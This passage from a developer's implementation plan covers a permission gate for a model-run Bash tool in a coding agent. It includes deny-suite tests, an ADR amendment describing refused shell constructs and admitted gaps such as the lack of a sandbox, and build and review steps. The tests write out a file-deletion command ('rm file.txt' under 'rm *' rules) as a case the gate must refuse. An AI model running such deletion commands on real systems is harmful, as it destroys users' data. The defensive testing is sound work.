    const outcome = await call(session({ allow: ["rm *"], ask: ["rm *"] }), "rm file.txt");
    expect(outcome.kind).toBe("denied");
    if (outcome.kind === "denied") {
      expect(outcome.reason).toContain("Bash(rm *)");
      expect(outcome.reason).toContain("headless");
    }
  });

  test("row 11: a stage grant cannot reach an op that never declared Bash", async () => {
    const outcome = await call(session({ allow: ["*"], declared: ["Read"] }), "bun test");
    expect(outcome.kind).toBe("denied");
    if (outcome.kind === "denied") expect(outcome.reason).toContain("unknown tool");
  });
});

describe("positive checks (spec §6, second half)", () => {
  test("a granted single-segment command runs", async () => {
    const outcome = await call(session({ allow: ["echo *"] }), "echo hello");
    expect(outcome.kind).toBe("ok");
    if (outcome.kind === "ok") expect(outcome.content).toContain("hello");
  });

  test("a granted multi-segment command runs", async () => {
    const outcome = await call(session({ allow: ["echo *"] }), "echo a && echo b");
    expect(outcome.kind).toBe("ok");
    if (outcome.kind === "ok") expect(outcome.content).toContain("b");
  });

  test("a granted command writing inside the root runs, and the redirect lands", async () => {
    const outcome = await call(session({ allow: ["echo *"] }), "echo hi > out.txt");
    expect(outcome.kind).toBe("ok");
  });

  test("an allow rule grants Bash under a blanket-granted profile too (spec R10)", async () => {
    const outcome = await call(
      session({
        profileGrants: [...STRUCTURED_GRANTS, { tool: "Write", patterns: ["*"] }],
        allow: ["echo *"],
      }),
      "echo ok",
    );
    expect(outcome.kind).toBe("ok");
  });
});
```

Row 10 (`Mcp(srv:tool)` under `safe` advertises nothing) is covered end-to-end by `test/unit/agents/mcp-under-scoped.test.ts` from Task 6 — do not duplicate it here; instead add a one-line comment in this file pointing at it, so a reader checking §6 row-by-row finds all eleven.

- [ ] **Step 2: Run the deny suite**

Run: `bun test test/integration/permissions/bash-deny-suite.test.ts`
Expected: PASS. Each denial must come from the reason the row names — if row 4 passes because nothing was granted, the row proves nothing; assert on the reason text when in doubt.

- [ ] **Step 3: Write the ADR amendment**

Insert into `docs/adr/ADR-029-phase-c-native-coding-agent-scope.md` at the **END of §3** — after the existing `#### Amendment, 2026-09-06: an argv branch for RunCommand` block and immediately BEFORE `### 4. Permission policy stays in nax` (line 372 on `3accdbd6f`). §3 runs from line 171 to 371 and already carries TWO amendments (2026-09-03 at :182, 2026-09-06 at :256); appending after the 2026-09-03 one would put this amendment out of chronological order:

```markdown
#### Amendment, 2026-09-14: the trigger fired, and what shipped instead of a sandbox

This section deferred a shell with three named reopen triggers. One has fired:
**an operation that cannot be expressed over declared commands.** nax#1800
raised it for the `tdd-verifier` role, and it holds more broadly for the
fix-shaped roles — an implementer or rectifier repairing a build it has not
seen before is not a fixed set of project commands. So a shell ships, and this
amendment records the shape of the gate rather than reopening the question of
whether to build one.

**One deliberate asymmetry, recorded because it looks like an oversight.** The
role that RAISED the trigger — the verifier — is the one role that does not
declare `Bash` (ruled 2026-09-14). `verify.ts` carries no `Exec` precisely so a
verifier cannot install packages while judging the implementer's work, and a
`Bash(...)` rule covering an install command returns that ability by another
route. The verifier's own inexpressibility therefore remains OPEN, and closing
it is a separate decision with its own bar: a concrete verify-stage need that
no declared command can express, and a gate narrower than "the verifier may run
commands of its own". Widening the verifier's ceiling by quietly adding `Bash`
to its `tools` array is not that decision.

**What shipped.**

- A `Bash` tool taking a model-authored command string, executed as
  `[quality.shell, "-c", command]` through the existing `runArgv` seam
  (deadline, `detached`, process-group SIGKILL, `stripEnvVars`).
- **Deny-all by default in every profile.** `Bash` is absent from
  `unrestricted`'s blanket grant, has no built-in pattern list of its own
  (where `Exec` at least has `BUILT_IN_EXEC_PATTERNS`), and derives nothing
  from `quality.commands`. A command runs only where a human wrote a
  `Bash(...)` allow rule for that stage.
- **Per-segment analysis.** The command is lexed and split on `&&`, `||`, `;`,
  `|`, `&` and newline; every segment must match an allow rule, no segment may
  match a deny rule, and `DENIED_FLAGS`, root containment, `.git/` refusal,
  redirect targets and `cd` targets are checked per segment.
- **Safe-by-refusal.** Command and process substitution, here-documents, fd
  duplication and unbalanced quotes are refused outright, by name: a payload
  the gate cannot read does not get a shell.
- **The op ceiling stayed in code.** Only fix-shaped roles declare `Bash`.
  Review ops do not, and neither does the verifier: it judges the
  implementer's work, it already cannot install packages, and a Bash rule
  covering an install command would return that ability by another route.
  Config can narrow this ceiling, never widen it.

**What did NOT ship, and will not on this account.** OS-level sandboxing.
There is no namespace, seccomp or container boundary around a Bash call: a
granted command runs with the privileges of the nax process, inside the
permitted root. The gate bounds WHICH commands run and WHERE their paths may
point; it does not contain what a granted command then does. Anyone reading
this section for a containment guarantee should read that sentence twice.
Sandboxing remains out of scope and unclaimed.

**Refusal is a tested deliverable.** `test/integration/permissions/bash-deny-suite.test.ts`
is this feature's acceptance spine: eleven rows, each a call that must be
refused, exercised through the dispatch seam. This section's standing bar —
"whatever gate is designed must be able to say no, and must be tested on its
ability to say no" — is met by that file, and a build in which it does not run
is a failed build of the feature.

**Reopen condition for the interactive channel.** The three-state verdict ships
with an `AskResolver` seam whose only v1 implementation denies, recording the
ledger outcome `denied:ask` with the matched rule. A material rate of those
rows justifies building an interactive approval channel; zero rows means the
seam stays dormant. Metering first, mechanism later — the discipline this ADR
already applied to `RequestCapability`.
```

- [ ] **Step 4: Write the Permissions page**

Create `docs/guides/permissions.md` — the single page describing the whole surface (spec US-009). It must cover, in this order, with a runnable config example for each: profiles (`unrestricted`/`safe`/`scoped`) and what each decides for an UNMATCHED call; per-stage blocks (`execution.permissions.<stage>`, `inherit`, `default`); the expression grammar (`Tool`, `Tool(pattern,...)`, `Bash(prefix ...)`, `Mcp(server[:tool])`, `Exec(...)`); precedence (deny > ask > allow, unmatched falls to the profile) and that rule lists bind under EVERY profile; the `allowedTools` alias and the both-keys error; Bash segment semantics (per-segment match, refused constructs, containment of paths/redirects/`cd`, `DENIED_FLAGS`, the optional trailing `*`); `ask` and why it denies headless (`denied:ask` in the ledger); and a closing "what is NOT in this subsystem, and why" section naming `quality.commands` / `acceptance.command` (trusted project config, never wrapped — R8), `execution.commandInterceptor` (rewrite, not permission), op tool declarations (code-owned ceilings — R5), and containment (not expressible in config, no profile widens the root). Cross-link `guides/exec-allowlist.md` for the `Exec` argv branch and `guides/mcp-and-interception.md` for MCP attachment.

Then add the row to the table in `docs/README.md`, beside the Exec Allowlist row:

```markdown
| [Permissions](guides/permissions.md) | Profiles, per-stage allow/deny/ask rules, the expression grammar, Bash segment semantics, and what deliberately stays outside the permission subsystem |
```

- [ ] **Step 5: Run every gate**

```bash
bun run typecheck
bun run check:all
bun run test
bun run test:coverage
```

Expected: all green. Notes for the failures this plan can predict:
- `check:file-sizes` — `src/tools/policy-bash.ts`, `src/permissions/bash-lex.ts` and `src/tools/bash.ts` must each be ≤600 lines; `coding-tool-support.ts` grew and must stay under it too. Split rather than baseline.
- `test:coverage` — each new `src/` file needs ≥0.8. `bun run test:coverage:list` names anything short.
- `check:alias-internals` — `src/` may import `@/permissions` and `@/tools` (barrels) but not `@/permissions/bash-lex`; same-directory relative imports are fine.
- `check:import-cycles` — if this fails on `src/tools` ↔ `src/permissions`, a VALUE import was added to `src/permissions` from `src/tools`; move it back behind an injected callback (Deviation 2), do not update the baseline.
- `check:permission-mode-ssot` — a `"approve-all"`/`"approve-reads"` literal outside `src/config/permissions.ts` needs its `// nax-permission-mode-allow:` comment.

- [ ] **Step 6: Commit**

```bash
git add test/integration/permissions/bash-deny-suite.test.ts docs/guides/permissions.md docs/README.md docs/adr/ADR-029-phase-c-native-coding-agent-scope.md
git commit -m "docs(adr): amend ADR-029 section 3 for the shipped Bash gate

Adds the deny suite as the feature's acceptance spine, the Permissions
guide, and the dated amendment recording the fired trigger, the gate's
shape, and that sandboxing is explicitly not claimed."
```

- [ ] **Step 7: STOP — review before push**

Do NOT push and do NOT open a PR. Report to the human:
- the branch (`feat/native-bash-tool`) and its commits;
- `bun run check:all` / `bun run test` / `bun run test:coverage` output;
- every deviation from the Global Constraints list, restated for the PR body;
- which spec §6 rows are covered where.

A code review runs BEFORE the push (standing user ruling). The PR carries this plan, the implementation, and the deviation list; #374 and the shell half of #1800 close against it, and the prompt-builder rework for #1800 beyond the tool description is filed as a follow-up issue (spec US-009).

---

## Self-review notes (kept for executors)

**Spec coverage.** US-004 → Tasks 2, 4, 5. US-005 → Tasks 1, 3. US-006 → Task 6. US-007 → verified-only (Plan A shipped the seam; Task 7 Step 4 pins the message, Task 8's row 9 pins the ledger-visible outcome). Rows 1 and 11 are satisfied by the construction/grant split — see Deviation 8, and do not "simplify" either gate without re-reading both rows. US-008 → Task 7. US-009 → Task 8. §5 sequence 4 → Tasks 1–5; 5 → Task 6; 6 → Tasks 7–8. §6: rows 1, 2, 11 → Task 8 (+ Task 4's wiring test); 3–8 → Tasks 3 and 8; 9 → Tasks 3, 7, 8; 10 → Task 6. R2 → Task 4's description and the untouched Git tool. R4 → Task 2. R9 → Task 8. R10 → Task 8's last positive check. R11 → Task 1.

**Known gaps, deliberately left.** (a) An opaque `$VAR` in PAYLOAD position is admitted by a `*` pattern token — the spec permits `$VAR` expansion and this is its cost; a stage that cannot tolerate it writes narrower patterns. (b) `2>&1` and `&>` are refused rather than modelled; if real runs show that biting, the lexer grows those two forms in a follow-up, not by loosening the refusal. (c) The `AskResolver` is still injected nowhere (`runtime.ts` defaults to headless) — correct for v1, and the point at which an interactive channel plugs in is `resolveCodingToolSupport`.

**Type consistency.** `BASH_TOOL_NAME` (Task 2) is used by Tasks 3–7. `lexBashCommand`/`BashSegment`/`BashToken`/`BashRedirect` (Task 1) are consumed by Task 3 only. `checkBashCommand`/`BashCheck` (Task 3) by `policy.ts` only. `createBashTool`/`BashToolOptions`/`_bashToolDeps`/`BASH_TIMEOUT_MS` (Task 4) by `coding-tool-support.ts` and tests. `partitionMcpRules`/`mcpRuleAdmits`/`expandMcpRuleGrants`/`MCP_RULE_TOOL` (Task 6) by `coding-tool-support.ts` and `config-guards.ts`. `redirectForCommand` (Task 7) by `runtime.ts`. `ToolScope.commandField` is added once (Task 3) and read by `policy.ts`, `bash.ts` and `runtime.ts`.
